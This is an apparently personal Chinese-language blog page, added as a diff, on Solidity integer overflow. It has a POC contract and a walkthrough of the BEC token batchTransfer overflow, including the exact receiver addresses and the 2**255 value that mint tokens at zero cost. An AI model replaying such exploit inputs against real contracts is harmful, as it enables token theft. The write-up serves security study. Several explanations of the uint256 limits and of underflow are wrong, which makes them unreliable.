@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.font.im/css?family=HarmonyOS_Regular:300,300italic,400,400italic,700,700italic%7CJetBrains+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="简单记叙了加减乘的溢出和案例">
+<meta property="og:type" content="article">
+<meta property="og:title" content="合约溢出漏洞">
+<meta property="og:url" content="http://example.com/2022/06/09/%E5%90%88%E7%BA%A6%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Shoulian Blog">
+<meta property="og:description" content="简单记叙了加减乘的溢出和案例">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609110929837.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609111121193.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113059622.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113315782.png">
+<meta property="article:published_time" content="2022-06-09T03:34:24.000Z">
+<meta property="article:modified_time" content="2022-06-09T03:35:37.290Z">
+<meta property="article:author" content="Shou lian">
+<meta property="article:tag" content="合约安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609110929837.png">
+
+
+<link rel="canonical" href="http://example.com/2022/06/09/%E5%90%88%E7%BA%A6%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/06/09/%E5%90%88%E7%BA%A6%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","path":"2022/06/09/合约溢出漏洞/","title":"合约溢出漏洞"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>合约溢出漏洞 | Shoulian Blog</title>
+  
+
+
+
+
+
+<link rel="preconnect" href="https://s1.hdslb.com/" />
+<link rel="stylesheet" href="//s1.hdslb.com/bfs/static/jinkela/long/font/regular.css" media="all" onload="this.media='all'" />
+<link rel="stylesheet" href="//s1.hdslb.com/bfs/static/jinkela/long/font/medium.css" media="all" onload="this.media='all'" />
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Shoulian Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>Tags</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%8A%A0%E6%B3%95%E6%BA%A2%E5%87%BA"><span class="nav-number">1.</span> <span class="nav-text">1、加法溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%87%8F%E6%B3%95%E6%BA%A2%E5%87%BA"><span class="nav-number">2.</span> <span class="nav-text">2、减法溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E4%B9%98%E6%B3%95%E6%BA%A2%E5%87%BA"><span class="nav-number">3.</span> <span class="nav-text">3、乘法溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%99%85%E6%94%BB%E5%87%BB%E4%BE%8B%E5%AD%90"><span class="nav-number"></span> <span class="nav-text">实际攻击例子</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BEC-%E6%BA%A2%E5%87%BA%E6%A1%88%E4%BE%8B"><span class="nav-number">1.</span> <span class="nav-text">BEC 溢出案例</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Shou lian</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdn.jsdelivr.net/npm/@creativecommons/vocabulary@2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/09/%E5%90%88%E7%BA%A6%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Shou lian">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shoulian Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="合约溢出漏洞 | Shoulian Blog">
+      <meta itemprop="description" content="简单记叙了加减乘的溢出和案例">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          合约溢出漏洞
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-06-09 11:34:24 / Modified: 11:35:37" itemprop="dateCreated datePublished" datetime="2022-06-09T11:34:24+08:00">2022-06-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web3/" itemprop="url" rel="index"><span itemprop="name">Web3</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">简单记叙了加减乘的溢出和案例</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="1、加法溢出">1、加法溢出</h3>
+<p><code>uint256</code>的值是<code>2**256</code></p>
+<p>如果输入的值是<code>2**256-1</code>然后在加任何一个大于0的无符号数字就会溢出变成<code>0</code></p>
+<p>比如<code>2**256-1</code> + <code>1</code> = <code>0</code></p>
+<p><code>2**256-1</code> + <code>2</code> = <code>1</code></p>
+<h3 id="2、减法溢出">2、减法溢出</h3>
+<p>如果<code>uint256</code>类型的变量是等于<code>0</code>的数，那么此时再减去一个小于<code>0</code>的数就会变成<code>2**256-1</code>的值</p>
+<h3 id="3、乘法溢出">3、乘法溢出</h3>
+<p>如果<code>uint256</code>类型的变量超过它的最大值(<code>2**255 - 1</code>)，最后就会回绕变成<code>0</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT  </span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="variable constant_">POC</span>&#123;</span><br><span class="line">    uint256 public _addnum;</span><br><span class="line">    uint256 public _subnum;</span><br><span class="line">    uint256 public _mulnum;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add_overflow</span>(<span class="params"></span>)&#123; <span class="comment">// 加法溢出</span></span><br><span class="line">        uint256 max = <span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>;</span><br><span class="line">        _addnum = max + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">sub_underflow</span>(<span class="params"></span>)&#123; <span class="comment">// 减法溢出</span></span><br><span class="line">        uint256 min = <span class="number">0</span>;</span><br><span class="line">        _subnum = min - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">mul_overflow</span>(<span class="params"></span>)&#123; <span class="comment">// 乘法溢出</span></span><br><span class="line">        uint256 mul = <span class="number">2</span> ** <span class="number">255</span>;</span><br><span class="line">        _mulnum = mul * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609110929837.png" alt="image-20220609110929837"></p>
+<h2 id="实际攻击例子">实际攻击例子</h2>
+<h3 id="BEC-溢出案例">BEC 溢出案例</h3>
+<p><a target="_blank" rel="noopener" href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a></p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609111121193.png" alt="image-20220609111121193"></p>
+<p>合约地址：<a target="_blank" rel="noopener" href="https://eth.tokenview.com/cn/address/0xc5d105e63711398af9bbff092d4b6769c82f793d%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%9C%A8%E9%87%8C%E9%9D%A2%E8%8E%B7%E5%8F%96%E6%94%BE">https://eth.tokenview.com/cn/address/0xc5d105e63711398af9bbff092d4b6769c82f793d，代码在里面获取放</a><code>remix</code>里跑一下就行</p>
+<p>乘法溢出点在于他的<code>batchTransfer</code>函数</p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113059622.png" alt="image-20220609113059622"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) public whenNotPaused returns (bool) &#123;</span><br><span class="line">  uint cnt = _receivers.<span class="property">length</span>;</span><br><span class="line">  uint256 amount = <span class="title function_">uint256</span>(cnt) * _value; <span class="comment">// 溢出点在这</span></span><br><span class="line">  <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;= <span class="number">20</span>); <span class="comment">// 这个cnt是地址的长度，最小不能小于0，最大不能大于20个地址</span></span><br><span class="line">  <span class="built_in">require</span>(_value &gt; <span class="number">0</span> &amp;&amp; balances[msg.<span class="property">sender</span>] &gt;= amount); <span class="comment">// 传入的_value值必须大于0 并且 转账的用户余额要大于或等于当前转账数</span></span><br><span class="line"></span><br><span class="line">  balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(amount);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; cnt; i++) &#123;</span><br><span class="line">      balances[_receivers[i]] = balances[_receivers[i]].<span class="title function_">add</span>(_value);</span><br><span class="line">      <span class="title class_">Transfer</span>(msg.<span class="property">sender</span>, _receivers[i], _value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>部署后在<code>_receivers</code>里放<code>[&quot;0x617F2E2fD72FD9D5503197092aC168c91465E7f2&quot;,&quot;0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB&quot;]</code></p>
+<p>在<code>_value</code>里放 <code>&quot;57896044618658097711785492504343953926634992332820282019728792003956564819968&quot;</code>（2**255的值）</p>
+<p><img src="https://raw.githubusercontent.com/shoulian2022/iamges/main/mark_imageimage-20220609113315782.png" alt="image-20220609113315782"></p>
+<p>然后就可以看到 通过溢出 我只需要耗费<code>0</code>的代币就可以获取到<code>57896044618658097711785492504343953926634992332820282019728792003956564819968</code>个代币</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag"># 合约安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/05/19/Solidity%E6%A1%88%E4%BE%8B-%E5%AD%98%E6%AC%BE%E5%90%88%E7%BA%A6/" rel="prev" title="Solidity案例-存款合约">
+                  <i class="fa fa-chevron-left"></i> Solidity案例-存款合约
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shou lian</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
